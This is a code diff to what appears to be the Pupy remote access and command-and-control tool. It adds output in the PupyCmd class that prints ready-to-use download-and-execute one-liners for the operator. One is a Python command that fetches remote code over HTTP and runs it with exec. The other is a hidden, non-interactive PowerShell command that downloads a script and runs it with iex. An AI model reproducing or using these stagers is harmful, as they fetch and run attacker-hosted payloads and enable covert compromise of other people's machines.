@@ -918,6 +918,18 @@ class PupyCmd(cmd.Cmd):
                 ])
 
             self.display_success('WWW URI PATH: /{}'.format(wwwpath))
+            host="<host:port>"
+            try:
+                for i in range(0,len(args.launcher_args)):
+                    if args.launcher_args[i]=="--host":
+                        host=args.launcher_args[i+1]
+                        break
+            except:
+                pass
+            if args.format=='py':
+                self.display_success("ONELINER: python -c 'import urllib;exec urllib.urlopen(\"http://{}/{}\").read()'".format(host, wwwpath))
+            elif args.format=='ps1':
+                self.display_success("ONELINER: powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://{}/{}')\"".format(host, wwwpath))
 
     def do_dnscnc(self, arg):
         """ DNSCNC commands """
